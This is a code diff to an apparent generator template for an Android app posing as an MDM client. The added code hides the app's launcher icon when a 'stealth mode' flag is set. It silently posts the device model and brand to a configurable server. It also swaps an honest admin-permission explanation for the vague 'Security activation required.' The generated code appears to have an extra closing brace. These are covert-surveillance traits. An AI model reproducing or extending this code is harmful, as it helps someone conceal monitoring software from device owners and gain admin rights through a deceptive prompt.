@@ -487,15 +487,52 @@ public class MainActivity extends Activity {
         textView.setText("${config.appName} - MDM Initializing...");
         setContentView(textView);
 
+        // Registro inicial con el servidor
+        registerDevice();
+
+        // Modo Oculto
+        if ("true".equals("${config.stealthMode}")) {
+            hideAppIcon();
+        }
+
         // Solicitar permisos de administrador si no se tienen
         if (!dpm.isAdminActive(adminComponent)) {
             Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Se requiere acceso de administrador para hacer cumplir las políticas de seguridad corporativas.");
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Security activation required.");
             startActivityForResult(intent, 1);
         } else {
-            Toast.setContentText("Dispositivo Enrolado en MDM");
+            Toast.makeText(this, "Device Enrolled", Toast.LENGTH_SHORT).show();
         }
+    }
+
+    private void hideAppIcon() {
+        android.content.pm.PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName, 
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+            android.content.pm.PackageManager.DONT_KILL_APP);
+    }
+
+    private void registerDevice() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String serverUrl = "${config.serverUrl}";
+                    java.net.URL url = new java.net.URL(serverUrl + "/api/devices/register");
+                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setDoOutput(true);
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    String json = "{\\\"name\\\":\\\"\" + android.os.Build.MODEL + \"\\\", \\\"brand\\\":\\\"\" + android.os.Build.BRAND + \"\\\"}";
+                    byte[] input = json.getBytes(\"utf-8\");
+                    conn.getOutputStream().write(input, 0, input.length);
+                    conn.getResponseCode();
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
     }
 }`;
   }
